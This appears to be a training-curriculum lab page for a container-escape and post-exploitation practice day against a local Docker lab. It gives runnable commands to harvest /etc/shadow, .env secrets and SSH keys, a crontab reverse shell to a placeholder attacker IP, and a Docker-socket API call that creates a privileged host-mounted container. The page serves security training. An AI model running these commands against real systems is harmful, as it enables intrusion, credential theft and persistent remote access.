---
title: "Infrastructure Practice Day 7 — Container Escape and Post-Exploitation Chain"
tags: [practice, container-escape, docker, post-exploitation, persistence,
       lateral-movement, T1611, T1547, T1021, ATT&CK]
module: 04-BroadSurface-04
day: 252
related_topics:
  - Container Escape (Day 240)
  - Post-Exploitation Basics (Day 241)
  - Infrastructure Practice Day 6 (Day 251)
  - Infrastructure Practice Day 8 (Day 253)
---

# Day 252 — Infrastructure Practice Day 7: Container Escape and Post-Exploitation Chain

> "Landing in a container is not landing on the target. A container is a
> waiting room with a false ceiling. Today you push through the ceiling and
> then — immediately — pivot. Getting out of the container is step one.
> What you do with the host is the rest of the engagement."
>
> — Ghost

---

## Goals

By the end of today's session you will have:

1. Identified the available escape path(s) in the lab container.
2. Escaped from the container to the host.
3. Harvested credentials from the host.
4. Planted a persistence mechanism on the host.
5. Verified persistence survives a container restart.

**Time budget:** 5–6 hours.

---

## Lab Setup

```bash
cd 04-BroadSurface-04/samples/container-escape-lab/
docker compose up -d

# Lab provides:
# - Container A: privileged container (you start here)
# - Container B: container with Docker socket mounted
# - Host filesystem is the Docker host (your machine or a VM)

# Connect to Container A:
docker exec -it container-a bash
```

---

## Phase 1 — Container Identification and Privilege Check

```bash
# Identify: am I in a container?
ls /.dockerenv && cat /proc/1/cgroup | grep docker

# What capabilities do I have?
capsh --print 2>/dev/null
cat /proc/1/status | grep CapEff

# Is the Docker socket mounted?
ls -la /var/run/docker.sock 2>/dev/null

# Is the host filesystem mounted?
mount | grep /host 2>/dev/null
```

```
Container ID: ___
Capabilities (privileged Y/N): ___
Docker socket accessible: Y / N
Host filesystem mounted: Y / N
Available escape paths: ___
```

---

## Phase 2 — Container Escape

Choose the highest-priority available path:

```
Priority:
1. Host filesystem mount → direct file write (no exploit)
2. Docker socket → API call to create privileged container
3. Privileged container → cgroup release_agent

Execute the path without notes:
```

```
[ ] Escape technique chosen: ___
[ ] Executed without looking at notes: Y / N
[ ] Host root shell obtained: Y / N
[ ] Confirmed: hostname / id on host
Time taken: ___ min
```

---

## Phase 3 — Post-Escape Harvesting

```bash
# On the host as root:

# Harvest credentials
cat /etc/shadow | head -20
find / -name "*.env" -readable 2>/dev/null | xargs grep -l "PASSWORD\|SECRET"
find /home -name ".bash_history" 2>/dev/null | xargs cat

# Check for SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null -readable
```

```
[ ] /etc/shadow readable
[ ] Credentials found: ___
[ ] SSH keys found: ___
```

---

## Phase 4 — Persistence on Host

Plant at least two persistence mechanisms:

```bash
# Mechanism 1: SSH authorized_keys
mkdir -p /root/.ssh
echo "<your-public-key>" >> /root/.ssh/authorized_keys

# Mechanism 2: cron job
echo "* * * * * root bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /etc/crontab

# Mechanism 3 (optional): systemd service
```

```
[ ] SSH key planted: test with ssh root@<host-ip>
[ ] Cron job added: wait 1 min for callback
[ ] Persistence survives container restart: Y / N
```

---

## Phase 5 — Container B (Docker Socket Path)

```bash
# Connect to Container B (has Docker socket):
docker exec -it container-b bash

# Escape via Docker API:
curl -s --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["id"],"Binds":["/:/host"],"Privileged":true}' \
  http://localhost/containers/create | jq -r '.Id'
```

```
[ ] Docker socket confirmed accessible
[ ] New privileged container created via API
[ ] Command executed as root on host
```

---

## Reflection

```
Which escape path was fastest?  ___
Which was most reliable?  ___
Which persistence mechanism would survive a full host reboot?  ___
What detection artefact did your escape leave? (check /var/log/syslog) ___
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q252.1, Q252.2 …).

---

## Navigation

← Previous: [Day 251 — Infrastructure Practice Day 6](DAY-0251-Infrastructure-Practice-Day-6.md)
→ Next: [Day 253 — Infrastructure Practice Day 8](DAY-0253-Infrastructure-Practice-Day-8.md)
